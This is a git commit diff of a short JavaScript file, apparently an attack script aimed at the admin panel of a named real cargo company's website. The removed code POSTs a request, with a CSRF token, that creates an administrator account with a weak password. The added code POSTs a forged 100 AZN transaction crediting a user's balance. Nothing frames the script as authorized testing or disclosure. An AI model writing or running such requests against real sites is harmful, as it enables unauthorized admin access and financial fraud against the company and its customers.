bc65aa978bf6d5a803edfe1b64725ad00b230adf
0xR4 <158718469+0xR4@users.noreply.github.com>
2024-10-22 01:34:57 +0400

    Update t.js

--- t.js
+++ t.js
@@ -1,37 +1,33 @@
-const url = 'https://admin.westcargo.az/admins';
+const url = 'https://admin.westcargo.az/transactions';
+const data = {
+    "_token": "Rd8K5pjXc8SKpKqzuTnuE0XWKF6aGH0YAVY0cLOn",
+    "who": "ADMIN",
+    "note": "HELLO",
+    "user_id": 117,
+    "amount": "100",
+    "currency": "AZN",
+    "for_country": "TR",
+    "type": "OUT",
+    "paid_for": "ORDER_BALANCE",
+    "paid_by": "MILLION"
+};
 
-const formData = new FormData();
-formData.append('_token', 'XzU4VRQDzRaTwXKXETW5x2LwuK47ZYZ7cKWw5YZy');
-formData.append('avatar', new Blob(), ''); // Adjust if you have an actual file
-formData.append('name', 'test');
-formData.append('role_id', '1');
-formData.append('show_menu', '0');
-formData.append('show_menu', '1'); // Multiple values for 'show_menu'
-formData.append('separate_order', '0');
-formData.append('filials[]', '3');
-formData.append('districts[]', '2');
-formData.append('lang', 'az');
-formData.append('email', 'test@admin.com');
-formData.append('password', 'test123');
-
-function sendRequest() {
-    fetch(url, {
-        method: 'POST',
-        body: formData,
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error('Network response was not ok ' + response.statusText);
-        }
-        return response.json();
-    })
-    .then(data => {
-        console.log('Success:', data);
-    })
-    .catch((error) => {
-        console.error('Error:', error);
-    });
-}
-
-// Automatically send the request when the script runs
-sendRequest();
+fetch(url, {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(data)
+})
+.then(response => {
+    if (!response.ok) {
+        throw new Error('Network response was not ok ' + response.statusText);
+    }
+    return response.json();
+})
+.then(data => {
+    console.log('Success:', data);
+})
+.catch(error => {
+    console.error('Error:', error);
+});
